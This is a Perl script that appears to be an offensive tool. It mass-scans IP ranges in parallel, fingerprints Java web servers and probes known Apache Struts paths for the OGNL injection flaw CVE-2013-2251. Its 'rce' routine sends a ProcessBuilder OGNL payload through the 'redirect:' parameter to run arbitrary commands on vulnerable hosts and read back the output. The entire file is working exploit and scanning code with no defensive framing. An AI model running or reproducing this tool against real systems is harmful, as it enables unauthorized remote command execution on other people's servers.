use strict; 
use warnings;
use Parallel::ForkManager;
use IO::Socket;
use Getopt::Long;
use IO::Socket::SSL;

our %workers;

#./script ip/host
# options:
# --scan
#   --ipcount (used with --scan)
#   --threads=50 (used with --scan)
# --port=8080 (default: all ports)
# --path=/what/ever.action (default: all paths)
# --ssl
# --force (ignores regex for struts detection)
# --timeout=seconds (default: 1)
# --cmd="some command"
# --debug=1-3 1=important output, 2=all output, 3=no output (default:1)
# --log=1/2 yes/no (default:1)
# --logfile=somefile (default:appends log.txt)


my @ports=('80','8080','8088','9080','9081','9082','9083');
my @portssl=('9443,9444'); #not in use
my @paths=(
'/Hello_World_Struts2_Ant/index.action',
'/Wildcard_Method_Struts2_Mvn/Person.action',
'/Basic_Struts2_Ant/index.action',
'/struts2-showcase-2.0.6/tiles/index.action',
'/struts2-jquery-showcase-3.6.0/index.action',
'/struts2-jquery-showcase/index.action',
'/struts2-blank/example/Menu.action',
'/blank/example/Menu.action',
'/struts2-showcase/viewSource.action',
'/Interceptors_Struts2_Ant/index.action',
'/Form_XML_Validation_Struts2_Ant/index.action',
'/Using_Tags_Struts2_Ant/index.action',
'/Spring_Struts2_Ant/index.action',
'/Form_Validation_Struts2_Ant/index.action',
'/struts2/index.action',
'/index.action'
);
my @jbosspaths = ('/struts2-jboss-blank/example/Menu.action','/struts2-blank/example/Menu.action','/jboss-blank/example/Menu.action','/blank/example/Menu.action','/index.action','/struts2/index.action');

my ($path,$port,$ssl,$scan,$threads,$ipcount,$force,$type,$timeout,$cmd,$debug,$log,$logfile) = "";

GetOptions ("ipcount=i" => \$ipcount,
            "timeout=i" => \$timeout,
            "debug=i" => \$debug,
            "log=i" => \$log,
            "logfile=s" => \$logfile,
            "cmd=s" => \$cmd,
            "scan" => \$scan,
            "port=s" => \$port,
            "threads=i" => \$threads,
            "path=s"   => \$path,
            "ssl"   => \$ssl,
            "force"   => \$force)
  or die("Error in command line arguments\n");
  
if (!$log) { $log = 1; }
if (!$logfile) { $logfile = 'log.txt'; }
if (!$debug) { $debug = 1; }
if (!$timeout) { $timeout = 1; } 
use constant PATIENCE => $timeout; # seconds
if ($path) { @paths=($path); }  
if ($port) { @ports=($port); } 
if (!$ipcount) { $ipcount = 1; }
if (!$threads) { $threads = 1; }
my @target=split('\.',$ARGV[0]); #123.123.123.1

main();


sub main {
  outp("Threads Set: $threads",1);
  outp("Number of IPs to Scan: $ipcount",1);
  outp("Paths Loaded: ". ($#paths + 1),1);
  outp("Ports Loaded: ". ($#ports + 1),1);
  if ($log == 1) { outp("Using Log File: $logfile",1); }
  else { outp("Using Log File: No",1); }
  outp("Output Level: ". $debug,1);
  outp("Starting Apache Struts Scanner..\n",1);
  
  if ($scan) {
    if ($threads > 1) {
      my $pm = Parallel::ForkManager->new($threads);
      $pm->run_on_wait(\&dismiss_hung_workers, 1);  # 1 second between callback invocations
      for my $id (1 .. $ipcount) {
        if (my $pid = $pm->start) {
          $workers{$pid} = time();
          next;
        }
        my $ip = getip();
	   scan($ip,$id);
       $pm->finish;
      }
      $pm->wait_all_children;
    }
    else { 
      for (1 .. $ipcount) {
      my $ip = getip();
	  scan($ip,'1');
      }
    }
  }
  elsif ($cmd) { rce($ARGV[0],$cmd); }
  else { scan($ARGV[0],'1'); }
  outp("\nApache Struts Scanner Finished.",1);
}
sub dismiss_hung_workers {
  while (my ($pid, $started_at) = each %workers) {
    next unless time() - $started_at > PATIENCE;
    kill TERM => $pid;
    delete $workers{$pid};
  }
}
sub getip {
  if ($target[3] == 255) { 
    if ($target[2] == 255) { 
	  if ($target[1] == 255) { 
	    if ($target[0] == 255) { outp("wtf are you doing?",1);exit; }
		else { $target[1] = 0; $target[2] = 0; $target[3] = 0; $target[0] = ($target[0] + 1); };
	  }
	  else { $target[2] = 0; $target[3] = 0; $target[1] = ($target[1] + 1); };
	}
	else { $target[3] = 0; $target[2] = ($target[2] + 1); };
  }
  else { $target[3] = ($target[3] + 1); }
  return "$target[0].$target[1].$target[2].$target[3]";
}
sub scan {
my $id = "\[tID: $_[1]\]:";
my $joinports = join(',',@ports);
outp("$id Scanning IP: ".$_[0]." (ports: $joinports)",2);
foreach my $port (@ports) {  
  my $req = " HTTP/1.1\r\n"
  . "Host: $_[0]\r\n"
  . "Referer: http://$_[0]\r\n"
  . "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24\r\n"
  . "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
  . "Accept-Encoding: *\r\n"
  . "Accept-Language: en-US;q=0.6,en;q=0.4\r\n"
  . "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.3\r\n"
  . "Connection: close\r\n\r\n";
  my ($sock,$check,$socket,$filter) = "";
  if (!$force) {
    #attempts to id the server and detect a page to test
    $socket= IO::Socket::INET->new(PeerAddr=>"$_[0]:$port",Proto=>'tcp',Timeout=>$timeout);
    if ($ssl) { $socket= IO::Socket::SSL->new(PeerHost => "$_[0]",PeerPort => "$port",Timeout=>$timeout); }
    if ($socket) {  
  	  $check = "GET /";
      print $socket $check.$req;
      while (<$socket>) { $sock = $sock.$_; }
      $socket->close();
	  if ($sock =~ /(Tomcat|Apache-Coyote|Glassfish|JBoss|Websphere|Weblogic|\.action|JSESSIONID|The document has moved|Moved Temporarily|Apache)/) { $filter = 1;$type=$1; }
	  my $detect = "";
	  if ($sock =~ /(location\=\"(.*)\"\;)/ and length($sock) < 500) { $detect = "$2"; }
	  elsif ($sock =~ /(window.open.?\(\'(.*)\))/) { 
		my $found = $2;
	    my @split = split("'", $found);
	    if ($split[0] =~ /;/) {
	      my @split = split(';', $split[0]);
		  if ($split[0]) { $found = $split[0]; }
		}
		else { $found = $split[0]; }
		if ($found =~ /^\/.*\.action$/) { outp("Valid path found to test0: $found",2); @paths=($found); $filter = 1;$type="auto"; }
		else { $detect = "$found";outp("Redirect Found#0: $found",2); }
	  }
	  elsif ($sock =~ /(The document has moved.*href.?\"(.*)\">)/) { 
	    my $cut = $2;
	    print "here: $cut\n";
	    if ($cut =~ /http/) {
			#print "here:3\n";
			my @split = split('/', $cut);
			my $eee = "";
			foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			if ($eee =~ /^\/.*\.action$/) { outp("$id Valid path found to test3: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			elsif ($eee =~ /^\//){ $detect = "$eee";  }#outp("$id Redirect Found#4: $eee",2); }
		}
		elsif ($cut =~ /^(\/.*\.action)$/) { my $found = $1;outp("$id Valid path found to test3: $found",2); @paths=($found); $filter = 1;$type="auto"; }
		elsif ($cut =~ /^(\/.*\/)$/) { $detect= $1; outp("Redirect Found#3: $detect",2); }
	  }
	#}
	  else { print "$id SOCKc: $sock\n";$socket->close();next; }
      if ($detect) {
	    #print "$id Redirect Detected: $detect\n"; 
		$socket= IO::Socket::INET->new(PeerAddr=>"$_[0]:$port",Proto=>'tcp',Timeout=>$timeout);
        if ($ssl) { $socket= IO::Socket::SSL->new(PeerHost => "$_[0]",PeerPort => "$port",Timeout=>$timeout); }
        if ($socket) {  
  	      $check = "GET $detect/";
          print $socket $check.$req;
		  $sock = "";
          while (<$socket>) { $sock = $sock.$_; }
		  print "$id Followed Redirect to: $detect\n"; 
		  if ($sock =~ /(Tomcat|Apache-Coyote|Glassfish|JBoss|Websphere|Weblogic|\.action|JSESSIONID|The document has moved|Moved Temporarily|Apache)/) { $filter = 1;$type=$1; }
		  if ($sock =~ /(window\.open.?\(\'(.*)\))/) { 
		    my $found = $2;
			my @split = split("'", $found);
			if ($split[0] =~ /;/) {
			  my @split = split(';', $split[0]);
			  if ($split[0]) { $found = $split[0]; }
			}
			else { $found = $split[0]; }
			if ($found =~ /^\/.*\.action$/) { outp("$id Valid path found to test1: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			else { outp("Debug Redirect Found#1: $found",2); }
		  }
		  elsif ($sock =~ /(location\=\"(.*)\"\;)/) {
		    my $found = $2;
		    if ($found =~ /^\/.*\.action$/) { outp("$id Valid path found to test2: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			elsif ($found =~ /http/) {
			  #print "here:4\n";
			  my @split = split('/', $found);
			  my $eee = "";
			  foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			  if ($eee =~ /^\/.*\.action$/) { outp("Valid path found to test3: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			  else { outp("Debug Redirect Found#2: $found",2); }
		    }
			else { outp("Debug Redirect Found#1: $found",2); }
		  }
		  elsif ($sock =~ /(Location\: (.*)\n)/) {
		    my $found = $2;
			$found =~ s/\n//g;
	        $found =~ s/\r//g;
		    if ($found =~ /^\/.*\.action$/) { outp("Valid path found to test4: $found",2);@paths=($found); $filter = 1;$type="auto"; }
			elsif ($found =~ /http/) {
			  #print "here:4\n";
			  my @split = split('/', $found);
			  my $eee = "";
			  foreach (3..$#split) { $eee = $eee."/".$split[$_]; }
			  if ($eee =~ /^\/.*\.action$/) { outp("$id Valid path found to test: $eee",2); @paths=($eee); $filter = 1;$type="auto"; }
			  else { outp("$id Debug Redirect Found#4: $eee",2); }
		    }
			else { outp("$id Debug Redirect Found#3: $found",2); }
		  }
          $socket->close();#print $sock."\n";
	    }
	  }
	
    }
	 else { outp("$id SOCK: error",2);next; }
  }
  if (($filter == 1) or ($force)) { 
    if ($force) { $type = "forced"; }
	outp("$id \"$type\" detected on: $_[0]:$port",2); 
	outp("$id Now Checking for Struts..",2);
	foreach my $p (@paths) {
	if (!$ssl) { $socket= IO::Socket::INET->new(PeerAddr=>"$_[0]:$port",Proto=>'tcp',Timeout=>$timeout); }
	else { $socket= IO::Socket::SSL->new(PeerHost => "$_[0]",PeerPort => "$port",Timeout=>$timeout); }
	if ($socket) { 
	  $check = "GET $p";
	  print $socket $check.$req;
	  $sock = "";
	  if (<$socket> =~ /200 OK/) { 
	    outp("$id Apache Struts Found! (path verified)",2); 
		outp("$id Checking if Struts is Vuln.. (trying ". ( $#paths + 1) ." paths)",2);
		$socket->close();
	    if (!$ssl) { $socket= IO::Socket::INET->new(PeerAddr=>"$_[0]:$port",Proto=>'tcp',Timeout=>$timeout); }
		else { $socket= IO::Socket::SSL->new(PeerHost => "$_[0]",PeerPort => "$port",Timeout=>$timeout); }
	    if ($socket) { 
	      $check = "GET $p?redirect:%25{new%20java.io.File('.').getCanonicalPath().concat({3*8888})}";
	      print $socket $check.$req;
	      $sock = "";
	      while (<$socket>) { $sock = $sock.$_; }
	      if ($sock =~ /\:\/\/(.*)\[26664/) { 
		    my $match = "";
			my @split = split('/',$p);
			if ($split[1]) {
			  @split = split($split[1],$1);
			  if ($split[1]) { $match = $split[1]; }
			}
		    if ($match =~ /\:/) { outp("$id Apache Struts Vuln Found (Windows: $match): $_[0]:$port $p (CVE: 2013-2251)",1); }
			elsif ($match) { outp("$id Apache Struts Vuln Found (Linux: $match): $_[0]:$port $p (CVE: 2013-2251)",1); }
			else { outp("$id Apache Struts Vuln Found (Linux: unknown_path): $_[0]:$port $p (CVE: 2013-2251)",1); }
		  }
		  #else { outp("$id Apache Struts Vuln Not Found!\n$sock",2); } #extra debug
		  else { outp("$id Apache Struts Vuln Not Found!\n",2); }
		  $socket->close();
		}
		else { outp("$id Socket Error #1",2); }
		last;
	  }
	  else { $socket->close(); }
	} 
	else { outp("$id Socket Error #0",2); } 
	outp("$id No Struts Found!",2);
	}
  }
  #else { outp("SOCK: $sock",2); $socket->close(); } extra debug
  else { ouutp("$id Doesnt match filter!",2);$socket->close(); }
 # }
}
}
sub rce {
  my $cmd = $_[1];
  $cmd =~ s/ /'\,'/g;
  $cmd = "'$cmd'";
  #print "cmd: $cmd\n";
  my $socket= IO::Socket::INET->new(PeerAddr=>"$_[0]:$ports[0]",Proto=>'tcp',Timeout=>$timeout);
  if ($ssl) { $socket= IO::Socket::SSL->new(PeerHost => "$_[0]",PeerPort => "$ports[0]",Timeout=>$timeout); }
  if ($socket) {  
    my $p = $paths[0];
	my @split = ();
	my $c = "%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{$cmd})).start()}";
	my $check = "GET $p?redirect:$c";
	my $full = "($_[0]:$ports[0]$p?redirect:$c)";
	#print "check: $check\n";
	my $req = " HTTP/1.1\r\n"
  . "Host: $_[0]\r\n"
  . "Referer: http://$_[0]\r\n"
  . "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24\r\n"
  . "Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
  . "Accept-Encoding: *\r\n"
  . "Accept-Language: en-US;q=0.6,en;q=0.4\r\n"
  . "Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.3\r\n"
  . "Connection: close\r\n\r\n";
    print $socket $check.$req;
    my $sock = "";
	#print <$socket>;
    while (<$socket>) { 
	  if ($_ =~ /Location/)  { @split = split('/',$_); }
	}
	my $match = "";
	if ($split[0] and $split[0] =~ /http/) { 
	  $match = $split[$#split];
	}
	if (!$match) { $match = "error_no_results"; }
	$match =~ s/\n//g;
	$match =~ s/\r//g;
	outp("Result: $match",1,$full);
    $socket->close();
  }
}

sub outp {
#1 debug output level 1 (more important)
#2 debug output all 
#3 no ouput
  my $data = $_[0];
  my $write = $_[1];
  my $extra = "";
  my $log1 = 0;
  if ($_[2]) { $extra = $_[2]; }
  
  if ($write == 2 and $debug == 2) { print $data."\n";$log1=1; }
  elsif ($write == 1 and $debug <= 2) { print $data."\n";$log1=1; }
  if ($log == 1 and $log1 == 1) {
    open(LOG, '>>'.$logfile);
    if ($extra) { print LOG $extra."\n".$data."\n"; }
    else { print LOG $data."\n"; }
    close(LOG);
  }
}
